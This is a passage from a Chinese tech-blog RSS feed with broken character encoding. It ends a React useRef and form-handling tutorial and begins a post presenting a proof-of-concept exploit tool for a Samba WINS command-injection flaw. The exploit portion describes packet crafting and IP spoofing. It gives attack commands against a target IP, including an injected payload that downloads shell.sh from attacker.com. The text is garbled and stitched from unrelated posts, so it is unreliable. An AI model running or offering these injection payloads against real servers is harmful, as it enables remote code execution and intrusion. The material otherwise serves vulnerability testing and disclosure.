<li>å³ä½¿ç»„ä»¶å¤šæ¬¡é‡æ–°æ¸²æŸ“ï¼Œ<code>timerId.current</code> ä¾ç„¶ä¿ç•™ä¸Šæ¬¡çš„å€¼ã€‚</li>
<li>å› æ­¤ï¼Œ<code>stop()</code> æ€»èƒ½æ‹¿åˆ°æ­£ç¡®çš„å®šæ—¶å™¨ IDã€‚</li>
</ul>
<p>ä¸Šè¿°ä¸¤ä¸ªåœºæ™¯ä½“ç°äº†<code>useRef</code> æä¾›ä¸€ä¸ª<strong>è·¨æ¸²æŸ“ä¿æŒä¸å˜çš„å¯å˜å®¹å™¨</strong>ï¼Œé€‚åˆå­˜å‚¨ DOM å¼•ç”¨æˆ–å‰¯ä½œç”¨ç›¸å…³çš„æ ‡è¯†ï¼ˆå¦‚å®šæ—¶å™¨ IDï¼‰ï¼Œä¸”ä¿®æ”¹å®ƒä¸ä¼šå¼•èµ·ç»„ä»¶<strong>é‡æ–°æ¸²æŸ“</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-11">ğŸ“ å—æ§ vs éå—æ§ï¼šè¡¨å•æ•°æ®çš„ä¸¤ç§è·å–æ–¹å¼</h3>
<p>React è¡¨å•æœ‰ä¸¤ç§å¤„ç†æ€è·¯ï¼š<strong>å—æ§ç»„ä»¶</strong> å’Œ <strong>éå—æ§ç»„ä»¶</strong>ã€‚å®ƒä»¬çš„æ ¸å¿ƒåŒºåˆ«åœ¨äºï¼š<strong>è°åœ¨æŒæ§è¡¨å•çš„å€¼</strong>ã€‚</p>
<h4 data-id="heading-12">1ï¸âƒ£ å—æ§ç»„ä»¶ï¼ˆControlled Componentï¼‰â€”â€”â€œä¸€åˆ‡å°½åœ¨æŒæ¡â€</h4>
<blockquote>
<p><strong>å½“è¡¨å•å…ƒç´ çš„å€¼ç”± React çŠ¶æ€ï¼ˆstateï¼‰é©±åŠ¨æ—¶ï¼Œè¿™ä¸ªè¡¨å•å…ƒç´ å°±æ˜¯ä¸€ä¸ªå—æ§ç»„ä»¶</strong></p>
</blockquote>
<ul>
<li>è¡¨å•å…ƒç´ çš„å€¼ç”± React state æ§åˆ¶ã€‚</li>
<li>å¿…é¡»é…åˆ <code>onChange</code> æ›´æ–°çŠ¶æ€ã€‚</li>
</ul>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [form, setForm] = <span class="hljs-title function_">useState</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> });

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-title function_">setForm</span>({
      ...form,
      [e.<span class="hljs-property">target</span>.<span class="hljs-property">name</span>]: e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span> <span class="hljs-comment">// åŠ¨æ€æ›´æ–°å­—æ®µ</span>
    });
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(form); <span class="hljs-comment">// { username: '...', password: '...' }</span>
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span>
        <span class="hljs-attr">value</span>=<span class="hljs-string">{form.username}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{handleChange}</span>
        <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥ç”¨æˆ·å"</span>
      /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span>
        <span class="hljs-attr">value</span>=<span class="hljs-string">{form.password}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{handleChange}</span>
        <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥å¯†ç "</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span>
      /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>æ³¨å†Œ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<h5 data-id="heading-13">å—æ§ç»„ä»¶çš„æ ¸å¿ƒåŸåˆ™</h5>
<blockquote>
<p><strong>â€œæœ‰ <code>value</code>ï¼Œå¿…æœ‰ <code>onChange</code>ã€‚â€</strong></p>
<p>å¦åˆ™è¾“å…¥æ¡†ä¼šè¢« React â€œé”ä½â€ï¼Œç”¨æˆ·æ— æ³•è¾“å…¥</p>
</blockquote>
<p>å¦‚æœæ²¡æœ‰<strong>onChange</strong>ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<ol>
<li>åˆå§‹æ—¶Â <code>form.username = ''</code>ï¼Œè¾“å…¥æ¡†ä¸ºç©º âœ…</li>
<li>ç”¨æˆ·è¾“å…¥ "alice" â†’ æµè§ˆå™¨å°è¯•æŠŠè¾“å…¥æ¡†å€¼æ”¹ä¸º "alice"</li>
<li><strong>ä½† React åœ¨æ¸²æŸ“æ—¶åˆå¼ºåˆ¶æŠŠÂ <code>value</code>Â è®¾å›Â <code>''</code></strong> ï¼ˆå› ä¸ºÂ <code>form.username</code>Â æ²¡å˜ï¼ï¼‰</li>
<li><strong>ç»“æœï¼šè¾“å…¥æ¡†â€œå¡ä½â€ï¼Œç”¨æˆ·æ— æ³•è¾“å…¥ä»»ä½•å†…å®¹ï¼</strong> Â âŒ</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆé€‰æ‹©å—æ§ç»„ä»¶ï¼Ÿ</strong></p>
<ul>
<li>æ•°æ®å®Œå…¨å—æ§ï¼Œä¾¿äºæ ¡éªŒã€æ ¼å¼åŒ–ã€è”åŠ¨ï¼ˆå¦‚ç¡®è®¤å¯†ç ï¼‰</li>
<li>ç¬¦åˆ React å•å‘æ•°æ®æµç†å¿µ</li>
</ul>
<hr/>
<h4 data-id="heading-14">2ï¸âƒ£ éå—æ§ç»„ä»¶ï¼ˆUncontrolled Componentï¼‰â€”â€”â€œç”¨æ—¶å†å–â€</h4>
<ul>
<li>è¡¨å•å…ƒç´ è‡ªå·±ç®¡ç†å€¼ï¼ˆåƒä¼ ç»Ÿ HTMLï¼‰ã€‚</li>
<li>é€šè¿‡ <code>useRef</code> åœ¨éœ€è¦æ—¶è¯»å– <code>.current.value</code>ã€‚</li>
</ul>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">CommentBox</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> textareaRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> comment = textareaRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span>;
    <span class="hljs-keyword">if</span> (!comment) <span class="hljs-keyword">return</span> <span class="hljs-title function_">alert</span>(<span class="hljs-string">'è¯·è¾“å…¥è¯„è®º'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(comment);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{textareaRef}</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¾“å…¥è¯„è®º..."</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

</code></pre>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šæ€§èƒ½ç•¥é«˜ï¼ˆæ— çŠ¶æ€æ›´æ–°ï¼‰ï¼Œä»£ç æ›´ç®€æ´ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šè¯„è®ºæ¡†ã€æ–‡ä»¶ä¸Šä¼ ã€ä¸€æ¬¡æ€§æäº¤çš„ç®€å•è¡¨å•ã€‚</li>
</ul>
<hr/>
<blockquote>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼šè¡¨å•æ•°æ®ç”±è°â€œæŒæ§â€ï¼Ÿ</strong></p>
</blockquote>


















































<table><thead><tr><th>å¯¹æ¯”ç»´åº¦</th><th>å—æ§ç»„ä»¶ï¼ˆControlledï¼‰</th><th>éå—æ§ç»„ä»¶ï¼ˆUncontrolledï¼‰</th></tr></thead><tbody><tr><td><strong>æ•°æ®æ¥æº</strong></td><td>React çš„ <code>state</code></td><td>DOM å…ƒç´ è‡ªèº«ï¼ˆåŸç”Ÿ HTML è¡Œä¸ºï¼‰</td></tr><tr><td><strong>å¦‚ä½•æ›´æ–°å€¼</strong></td><td>é€šè¿‡ <code>onChange</code> åŒæ­¥åˆ° state</td><td>ç”¨æˆ·ç›´æ¥æ“ä½œ DOMï¼ŒReact ä¸å¹²é¢„</td></tr><tr><td><strong>å¦‚ä½•è¯»å–å€¼</strong></td><td>ç›´æ¥è¯»å– <code>state</code></td><td>é€šè¿‡ <code>ref.current.value</code> è·å–</td></tr><tr><td><strong>æ˜¯å¦éœ€è¦ <code>value</code> + <code>onChange</code></strong></td><td>âœ… å¿…é¡»é…å¯¹ä½¿ç”¨</td><td>âŒ ä¸éœ€è¦ï¼ˆé€šå¸¸åªç”¨ <code>ref</code>ï¼‰</td></tr><tr><td><strong>æ˜¯å¦è§¦å‘ re-render</strong></td><td>æ¯æ¬¡è¾“å…¥éƒ½è§¦å‘</td><td>æ— çŠ¶æ€å˜åŒ–ï¼Œä¸è§¦å‘</td></tr><tr><td><strong>é€‚åˆåœºæ™¯</strong></td><td>éœ€è¦å®æ—¶æ ¡éªŒã€æ ¼å¼åŒ–ã€è”åŠ¨çš„å¤æ‚è¡¨å•ï¼ˆå¦‚ç™»å½•ã€æ³¨å†Œã€è®¾ç½®é¡µï¼‰</td><td>ä¸€æ¬¡æ€§æäº¤ã€ç®€å•è¾“å…¥ï¼ˆå¦‚è¯„è®ºæ¡†ã€æœç´¢æ¡†ã€æ–‡ä»¶ä¸Šä¼ ï¼‰</td></tr><tr><td><strong>ä¼˜ç‚¹</strong></td><td>- æ•°æ®æµæ¸…æ™° - æ˜“äºéªŒè¯/è½¬æ¢/è”åŠ¨ - ç¬¦åˆ React å“åº”å¼ç†å¿µ</td><td>- ä»£ç ç®€æ´ - æ€§èƒ½ç•¥é«˜ï¼ˆæ— é¢‘ç¹ setStateï¼‰ - æ¥è¿‘åŸç”Ÿ HTML ä¹ æƒ¯</td></tr><tr><td><strong>ç¼ºç‚¹</strong></td><td>- ä»£ç é‡ç¨å¤š - é¢‘ç¹è¾“å…¥å¯èƒ½å¼•å‘å¤šä½™æ¸²æŸ“ï¼ˆå¯é€šè¿‡é˜²æŠ–ä¼˜åŒ–ï¼‰</td><td>- æ— æ³•å®æ—¶å“åº”è¾“å…¥ - éš¾ä»¥å®ç°åŠ¨æ€æ ¡éªŒæˆ–å­—æ®µè”åŠ¨ - è¿èƒŒâ€œçŠ¶æ€é©±åŠ¨ UIâ€åŸåˆ™</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-15">âœ¨ æ€»ç»“ï¼š<code>useRef</code> çš„æ ¸å¿ƒä»·å€¼</h3>

























<table><thead><tr><th>ç”¨é€”</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><strong>1. è®¿é—® DOM å…ƒç´ </strong></td><td>è·å–çœŸå® DOMï¼Œè°ƒç”¨åŸç”Ÿæ–¹æ³•</td><td><code>.focus()</code>, <code>.scrollIntoView()</code></td></tr><tr><td><strong>2. æŒä¹…å­˜å‚¨å¯å˜å€¼</strong></td><td>ä¿å­˜ä¸è§¦å‘é‡æ¸²æŸ“çš„æ•°æ®</td><td>å®šæ—¶å™¨ IDã€WebSocket å®ä¾‹</td></tr><tr><td><strong>3. æ„å»ºéå—æ§ç»„ä»¶</strong></td><td>ä¸€æ¬¡æ€§è¯»å–è¡¨å•å€¼</td><td>è¯„è®ºæ¡†ã€æ–‡ä»¶ä¸Šä¼ </td></tr></tbody></table>
<p>è®°ä½ä¸€å¥è¯ï¼š</p>
<blockquote>
<p><strong>éœ€è¦ç•Œé¢è·Ÿç€å˜ï¼Ÿç”¨ <code>useState</code>ã€‚<br/>
åªæƒ³æ‚„æ‚„å­˜ä¸ªä¸œè¥¿æˆ–æ“ä½œ DOMï¼Ÿç”¨ <code>useRef</code>ã€‚</strong></p>
</blockquote>
<p><code>useRef</code> è™½ä¸å¼ æ‰¬ï¼Œå´æ˜¯ React å¼€å‘ä¸­ä¸å¯æˆ–ç¼ºçš„â€œå¹•åè‹±é›„â€ã€‚</p>
<p>æŒæ¡å®ƒï¼Œä½ å°±èƒ½åœ¨â€œä¼˜é›…çš„ Reactâ€å’Œâ€œçµæ´»çš„ DOMâ€ä¹‹é—´è‡ªç”±åˆ‡æ¢ï¼Œå†™å‡ºæ—¢å¥å£®åˆé«˜æ•ˆçš„ä»£ç ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥è§£æSamba WINSå‘½ä»¤æ³¨å…¥æ¼æ´(CVE-2025-10230) - å®Œæ•´PoCå®ç°]]></title>    <link>https://juejin.cn/post/7590071125397717032</link>    <guid>https://juejin.cn/post/7590071125397717032</guid>    <pubDate>2026-01-01T23:25:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125397717032" data-draft-id="7590071125397700648" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥è§£æSamba WINSå‘½ä»¤æ³¨å…¥æ¼æ´(CVE-2025-10230) - å®Œæ•´PoCå®ç°"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-01T23:25:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥è§£æSamba WINSå‘½ä»¤æ³¨å…¥æ¼æ´(CVE-2025-10230) - å®Œæ•´PoCå®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T23:25:44.000Z" title="Thu Jan 01 2026 23:25:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CVE-2025-10230 - Samba WINSé’©å­å‘½ä»¤æ³¨å…¥æ¼æ´PoC</h2>
<h3 data-id="heading-1">é¡¹ç›®æ ‡é¢˜ä¸æè¿°</h3>
<p><strong>Samba WINSå‘½ä»¤æ³¨å…¥æ¼æ´éªŒè¯å·¥å…·</strong></p>
<p>æœ¬é¡¹ç›®æä¾›äº†ä¸€ä¸ªé’ˆå¯¹CVE-2025-10230æ¼æ´çš„æ¦‚å¿µéªŒè¯(PoC)å®ç°ã€‚è¯¥æ¼æ´å­˜åœ¨äºSambaçš„WINSé’©å­å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå½“Sambaä½œä¸ºActive DirectoryåŸŸæ§åˆ¶å™¨å¹¶å¯ç”¨WINSæ”¯æŒæ—¶ï¼Œæœªç»éªŒè¯çš„NetBIOSåç§°ä¼šè¢«ç›´æ¥ä¼ é€’ç»™ç³»ç»Ÿshellï¼Œå¯¼è‡´å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>ï¼š</p>
<ul>
<li>æ¼”ç¤ºçœŸå®çš„WINSåè®®æ”»å‡»å‘é‡</li>
<li>æä¾›æ•™è‚²å’Œå®‰å…¨æµ‹è¯•å·¥å…·</li>
<li>å¸®åŠ©å®‰å…¨å›¢é˜ŸéªŒè¯å…¶Sambaéƒ¨ç½²çš„å®‰å…¨æ€§</li>
<li>å±•ç¤ºç½‘ç»œåè®®çº§åˆ«çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯</li>
</ul>
<h3 data-id="heading-2">åŠŸèƒ½ç‰¹æ€§</h3>
<h4 data-id="heading-3">æ ¸å¿ƒåŠŸèƒ½</h4>
<ul>
<li><strong>WINSåè®®åŒ…æ„é€ </strong>ï¼šå®Œæ•´å®ç°WINSåç§°æ³¨å†Œè¯·æ±‚æ•°æ®åŒ…æ„é€ </li>
<li><strong>å‘½ä»¤æ³¨å…¥è½½è·</strong>ï¼šæ”¯æŒè‡ªå®šä¹‰shellå‘½ä»¤æ³¨å…¥</li>
<li><strong>IPåœ°å€æ¬ºéª—</strong>ï¼šå…è®¸è®¾ç½®ä¼ªé€ çš„æºIPåœ°å€</li>
<li><strong>Scapyé›†æˆ</strong>ï¼šä½¿ç”¨Scapyåº“è¿›è¡Œåº•å±‚ç½‘ç»œåŒ…æ“ä½œ</li>
<li><strong>è¯¦ç»†æ—¥å¿—è¾“å‡º</strong>ï¼šæä¾›å®Œæ•´çš„æ”»å‡»è¿‡ç¨‹åé¦ˆ</li>
</ul>
<h4 data-id="heading-4">æŠ€æœ¯ç‰¹ç‚¹</h4>
<ul>
<li>åŸºäºRFC 1002çš„WINSåè®®å®ç°</li>
<li>æ”¯æŒNetBIOSåç§°ç¼–ç å’Œå‹ç¼©</li>
<li>æ­£ç¡®å¤„ç†UDP/42ç«¯å£ï¼ˆWINSæœåŠ¡ç«¯å£ï¼‰</li>
<li>å¯è°ƒèŠ‚çš„è¯¦ç»†è¾“å‡ºæ¨¡å¼</li>
<li>è·¨å¹³å°å…¼å®¹æ€§ï¼ˆéœ€è¦rootæƒé™ï¼‰</li>
</ul>
<h4 data-id="heading-5">ç‹¬ç‰¹ä»·å€¼</h4>
<ul>
<li>é’ˆå¯¹ç‰¹å®šä¸”å±é™©çš„Sambaé…ç½®åœºæ™¯</li>
<li>æä¾›å®é™…çš„æ¼æ´åˆ©ç”¨æ¼”ç¤ºè€Œéç†è®ºåˆ†æ</li>
<li>åŒ…å«å®Œæ•´çš„åè®®å±‚å®ç°ç»†èŠ‚</li>
</ul>
<h3 data-id="heading-6">å®‰è£…æŒ‡å—</h3>
<h4 data-id="heading-7">ç³»ç»Ÿè¦æ±‚</h4>
<ul>
<li>Python 3.6+</li>
<li>ç±»Unixæ“ä½œç³»ç»Ÿï¼ˆLinux, macOSï¼‰</li>
<li>Rootæƒé™ï¼ˆç”¨äºåŸå§‹å¥—æ¥å­—è®¿é—®ï¼‰</li>
</ul>
<h4 data-id="heading-8">ä¾èµ–å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…Scapyåº“</span>
pip install scapy

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨ç³»ç»ŸåŒ…ç®¡ç†å™¨</span>
<span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt-get install python3-scapy

<span class="hljs-comment"># RHEL/CentOS</span>
sudo yum install python3-scapy
</code></pre>
<h4 data-id="heading-9">å¿«é€Ÿå®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…‹éš†æˆ–ä¸‹è½½è„šæœ¬</span>
git <span class="hljs-built_in">clone</span> &lt;repository-url&gt;
<span class="hljs-built_in">cd</span> &lt;project-directory&gt;

<span class="hljs-comment"># è®¾ç½®æ‰§è¡Œæƒé™</span>
<span class="hljs-built_in">chmod</span> +x CVE-2025-10230.py

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
sudo python3 CVE-2025-10230.py --<span class="hljs-built_in">help</span>
</code></pre>
<h4 data-id="heading-10">æ³¨æ„äº‹é¡¹</h4>
<ol>
<li><strong>æƒé™è¦æ±‚</strong>ï¼šå¿…é¡»ä½¿ç”¨sudoæˆ–rootæƒé™è¿è¡Œï¼Œå› ä¸ºéœ€è¦åŸå§‹å¥—æ¥å­—è®¿é—®</li>
<li><strong>ç½‘ç»œæ¥å£</strong>ï¼šè„šæœ¬é»˜è®¤ä½¿ç”¨eth0æ¥å£ï¼Œå¯èƒ½éœ€è¦æ ¹æ®å®é™…ç¯å¢ƒè°ƒæ•´</li>
<li><strong>ç›®æ ‡ç¯å¢ƒ</strong>ï¼šä»…ç”¨äºæµ‹è¯•æˆæƒçš„å®éªŒå®¤ç¯å¢ƒ</li>
<li><strong>æ³•å¾‹åˆè§„</strong>ï¼šç¡®ä¿éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„å’Œæµ‹è¯•æˆæƒ</li>
</ol>
<h3 data-id="heading-11">ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-12">åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸºæœ¬æ”»å‡»å‘½ä»¤</span>
sudo python3 CVE-2025-10230.py &lt;ç›®æ ‡IPåœ°å€&gt;

<span class="hljs-comment"># ç¤ºä¾‹ï¼šæ”»å‡»192.168.1.10</span>
sudo python3 CVE-2025-10230.py 192.168.1.10
</code></pre>
<h4 data-id="heading-13">é«˜çº§é€‰é¡¹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è‡ªå®šä¹‰å‘½ä»¤æ³¨å…¥è½½è·</span>
sudo python3 CVE-2025-10230.py 192.168.1.10 \
  --payload <span class="hljs-string">"; wget http://attacker.com/shell.sh -O /tmp/shell.sh"</span>

<span class="hljs-comment"># æŒ‡å®šæºIPåœ°å€ï¼ˆIPæ¬ºéª—ï¼‰</span>
sudo python3 CVE-2025-10230.py 192.168.1.10 \
  --src_ip 192.168.1.50

<span class="hljs-comment"># å¯ç”¨è¯¦ç»†è¾“å‡ºæ¨¡å¼</span>
sudo python3 CVE-2025-10230.py 192.168.1.10 -v

<span class="hljs-comment"># ç»„åˆä½¿ç”¨æ‰€æœ‰é€‰é¡¹</span>
sudo python3 CVE-2025-10230.py 192.168.1.10 \
  --payload <span class="hljs-string">"; id &gt; /tmp/exploited.txt"</span> \
  --src_ip 10.0.0.100 \
  --verbose
</code></pre>
<h4 data-id="heading-14">å…¸å‹ä½¿ç”¨åœºæ™¯</h4>
